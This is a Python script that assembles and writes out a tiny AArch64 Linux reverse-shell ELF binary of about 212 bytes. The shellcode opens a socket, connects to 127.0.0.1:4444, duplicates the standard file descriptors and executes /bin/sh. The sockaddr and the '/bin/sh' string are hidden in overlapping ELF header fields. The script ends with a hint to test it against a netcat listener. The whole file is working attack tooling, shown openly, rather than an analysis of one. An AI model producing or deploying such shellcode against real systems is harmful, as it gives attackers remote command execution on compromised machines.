#!/usr/bin/env python3
"""
Downsized AArch64 Reverse Shell ELF (~212 bytes).
Header overlap: e_phoff=0x3C → 116-byte combined header (multiple of 4).
LDR literal for sockaddr load. Data in clobberable ELF header fields.
"""

import struct
import subprocess
import os
import tempfile

BASE = 0x10000
TOTAL_HEADER_SIZE = 116   # e_phoff=0x3C(60) + Phdr(56) = 116 (≡ 0 mod 4)
SOCKADDR_VAL = 0x0100007f5c110002  # 127.0.0.1:4444
BINSH_BYTES = b'/bin/sh\x00'


def ldr_decode(inst):
    """Decode LDR Xt, label (literal) → (rt, byte_offset)"""
    rt = inst & 0x1f
    imm19 = (inst >> 5) & 0x7ffff
    if imm19 & 0x40000:
        imm19 |= ~0x7ffff
    return rt, imm19 * 4


def ldr_encode(rt, byte_offset):
    imm19 = (byte_offset // 4) & 0x7ffff
    return 0x58000000 | (imm19 << 5) | rt


def adr_decode(inst):
    rd = inst & 0x1f
    immlo = (inst >> 29) & 3
    immhi = (inst >> 5) & 0x7ffff
    imm21 = (immhi << 2) | immlo
    if imm21 & 0x100000:
        imm21 |= ~0x1fffff
    return rd, imm21


def adr_encode(rd, imm21):
    imm21 &= 0x1fffff
    immlo = imm21 & 3
    immhi = (imm21 >> 2) & 0x7ffff
    return 0x10000000 | (immlo << 29) | (immhi << 5) | rd


def make_asm():
    return '''
    .arch armv8-a
    .text
    .global _start
_start:
    mov x0, #2
    mov x1, #1
    mov x8, #198
    svc #0
    mov x5, x0

    ldr x0, sockaddr_ref
    stp x0, xzr, [sp, #-16]!
    mov x0, x5
    mov x1, sp
    mov x2, #16
    mov x8, #203
    svc #0

    mov x1, #3
dup_loop:
    mov x2, xzr
    mov w0, w5
    subs x1, x1, #1
    mov x8, #24
    svc #0
    b.ne dup_loop

    adr x0, binsh_ref
    stp x0, xzr, [sp, #-16]!
    mov x1, sp
    mov x8, #221
    svc #0

sockaddr_ref:
    .quad 0x0100007f5c110002
binsh_ref:
    .asciz "/bin/sh"
'''


def build_elf(raw_code):
    SOCKADDR_BYTES = struct.pack('<Q', SOCKADDR_VAL)
    sockaddr_off = raw_code.find(SOCKADDR_BYTES)
    binsh_off = raw_code.find(BINSH_BYTES)

    print(f"  sockaddr at raw offset {sockaddr_off:#x}")
    print(f"  binsh at raw offset {binsh_off:#x}")

    data_start = min(sockaddr_off, binsh_off)
    real_code = bytearray(raw_code[:data_start])
    print(f"  Code size: {len(real_code)} bytes")

    # Patch LDR literal (sockaddr → file offset 0x08) and ADR (binsh → file offset 0x28)
    for i in range(0, len(real_code) - 4, 4):
        inst = struct.unpack('<I', real_code[i:i+4])[0]
        top_byte = (inst >> 24) & 0xff

        if top_byte == 0x58:   # LDR Xt, label (64-bit literal)
            rt, old_off = ldr_decode(inst)
            old_tgt = i + old_off
            if old_tgt == sockaddr_off:
                # Redirect to header offset 0x08 (e_ident[8:16])
                new_off = 0x08 - TOTAL_HEADER_SIZE - i
                print(f"  LDR X{rt} @ [{i:#x}]: sockaddr → hdr+0x08 ({new_off:#x})")
                assert new_off % 4 == 0, f"LDR offset {new_off} not multiple of 4!"
                real_code[i:i+4] = struct.pack('<I', ldr_encode(rt, new_off))

        elif (inst >> 24) == 0x10 and ((inst >> 28) & 1):  # ADR
            rd, old_imm = adr_decode(inst)
            old_tgt = i + old_imm
            if old_tgt == binsh_off:
                # Redirect to header offset 0x28 (e_shoff)
                new_imm = 0x28 - TOTAL_HEADER_SIZE - i
                print(f"  ADR X{rd} @ [{i:#x}]: binsh → hdr+0x28 ({new_imm:#x})")
                real_code[i:i+4] = struct.pack('<I', adr_encode(rd, new_imm))

    total_size = TOTAL_HEADER_SIZE + len(real_code)

    # Build 116-byte combined header
    h = bytearray(TOTAL_HEADER_SIZE)
    h[0:4] = b'\x7fELF'
    h[4]=2; h[5]=1; h[6]=1; h[7]=0
    struct.pack_into('<Q', h, 0x08, SOCKADDR_VAL)          # e_ident[8:16] = sockaddr
    struct.pack_into('<H', h, 0x10, 2)                     # e_type = ET_EXEC
    struct.pack_into('<H', h, 0x12, 0xb7)                  # e_machine = AArch64
    struct.pack_into('<I', h, 0x14, 1)                     # e_version
    struct.pack_into('<Q', h, 0x18, BASE + TOTAL_HEADER_SIZE)  # e_entry
    struct.pack_into('<Q', h, 0x20, 0x3C)                  # e_phoff = 60
    struct.pack_into('<Q', h, 0x28, int.from_bytes(BINSH_BYTES, 'little'))  # e_shoff = /bin/sh
    struct.pack_into('<I', h, 0x30, 0)                     # e_flags
    struct.pack_into('<H', h, 0x34, 64)                    # e_ehsize
    struct.pack_into('<H', h, 0x36, 56)                    # e_phentsize
    struct.pack_into('<H', h, 0x38, 1)                     # e_phnum
    struct.pack_into('<H', h, 0x3A, 0)                     # e_shentsize = 0

    # PHDR at 0x3C (56 bytes)
    # p_type at 0x3C: also sets e_shnum=1 (OK, e_shentsize=0) and e_shstrndx=0
    struct.pack_into('<I', h, 0x3C, 1)      # p_type = PT_LOAD
    struct.pack_into('<I', h, 0x40, 7)      # p_flags = RWX
    struct.pack_into('<Q', h, 0x44, 0)      # p_offset = 0
    struct.pack_into('<Q', h, 0x4C, BASE)   # p_vaddr
    struct.pack_into('<Q', h, 0x54, BASE)   # p_paddr
    struct.pack_into('<Q', h, 0x5C, total_size)  # p_filesz
    struct.pack_into('<Q', h, 0x64, total_size)  # p_memsz
    struct.pack_into('<Q', h, 0x6C, 1)      # p_align

    return bytes(h) + bytes(real_code)


def main():
    print("=== Downsized AArch64 Reverse Shell ===\n")
    asm = make_asm()

    with tempfile.TemporaryDirectory() as tmpdir:
        asm_file = os.path.join(tmpdir, 'rev.S')
        obj_file = os.path.join(tmpdir, 'rev.o')
        elf_file = os.path.join(tmpdir, 'rev.elf')
        raw_file = os.path.join(tmpdir, 'rev.bin')

        with open(asm_file, 'w') as f:
            f.write(asm)

        print("Assembling...")
        subprocess.run(['aarch64-linux-gnu-as', '-o', obj_file, asm_file],
                       check=True, capture_output=True)
        print("Linking...")
        subprocess.run([
            'aarch64-linux-gnu-ld', '-N', '--omagic', '-s',
            '-Ttext=0', '-o', elf_file, obj_file
        ], check=True, capture_output=True)
        print("Extracting raw binary...")
        subprocess.run([
            'aarch64-linux-gnu-objcopy', '--strip-section-headers',
            '-O', 'binary', elf_file, raw_file
        ], check=True, capture_output=True)

        with open(raw_file, 'rb') as f:
            raw_code = f.read()

        print(f"\nRaw code size: {len(raw_code)} bytes")
        print("\nDisassembly:")
        subprocess.run(['aarch64-linux-gnu-objdump', '-d', elf_file])
        print()

    print("Building final ELF...")
    elf_binary = build_elf(raw_code)

    output = 'rev_tiny'
    with open(output, 'wb') as f:
        f.write(elf_binary)
    os.chmod(output, 0o755)

    print(f"\n=== RESULT ===")
    print(f"Output: {output}")
    print(f"Size: {len(elf_binary)} bytes")

    print(f"\nHex dump:")
    for i in range(0, len(elf_binary), 16):
        hexb = ' '.join(f'{b:02x}' for b in elf_binary[i:i+16])
        asc = ''.join(chr(b) if 32 <= b < 127 else '.' for b in elf_binary[i:i+16])
        print(f"{i:04x}: {hexb:<48s} {asc}")

    try:
        print("\nreadelf -h:")
        subprocess.run(['readelf', '-h', output])
    except FileNotFoundError:
        pass

    print(f"\nreadelf -l:")
    try:
        subprocess.run(['readelf', '-l', output])
    except FileNotFoundError:
        pass

    print(f"\nTest: qemu-aarch64 ./{output}  +  nc -lvnp 4444")


if __name__ == '__main__':
    main()
